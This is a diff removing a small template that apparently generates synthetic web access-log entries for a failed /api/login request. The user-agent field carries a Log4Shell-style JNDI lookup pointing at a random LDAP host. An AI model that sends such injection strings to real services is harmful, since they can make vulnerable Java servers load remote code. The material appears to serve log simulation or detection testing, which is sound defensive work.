@@ -1,8 +1,0 @@
-{% set timestamp = current_timestamp() %}
-{% set source_ip = random_public_ip() %}
-{% set user_agent = random_user_agent() %}
-{% set jndi_payload = "${jndi:ldap://" ~ random_ip() ~ ":" ~ random_port() ~ "/" ~ random_string(8) ~ "}" %}
-{% set status_code = 400 %}
-{% set bytes_sent = random_int(1000, 5000) %}
-
-{{ source_ip }} - - [{{ timestamp | format_timestamp('%d/%b/%Y:%H:%M:%S %z') }}] "GET /api/login HTTP/1.1" {{ status_code }} {{ bytes_sent }} "-" "{{ user_agent }} {{ jndi_payload }}"
